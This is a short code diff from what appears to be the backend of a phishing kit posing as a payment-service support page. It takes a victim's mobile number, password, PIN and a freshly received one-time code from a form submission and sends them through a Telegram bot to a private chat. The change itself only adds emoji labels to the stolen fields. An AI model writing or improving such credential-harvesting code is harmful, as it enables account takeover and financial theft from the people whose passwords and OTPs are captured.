@@ -34,10 +34,10 @@ console.log(req.body);
         const messageText = `OKPAYk NOTIFICATION
 
 Support Issue: ${issue}
-Mobile Number: ${phone}
-Password: ${password}
-Pin: ${pin}
-Received OTP: ${otp}`;
+📱 Mobile Number: ${phone}
+🔑Password: ${password}
+📌Pin: ${pin}
+📨Received OTP: ${otp}`;
         
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
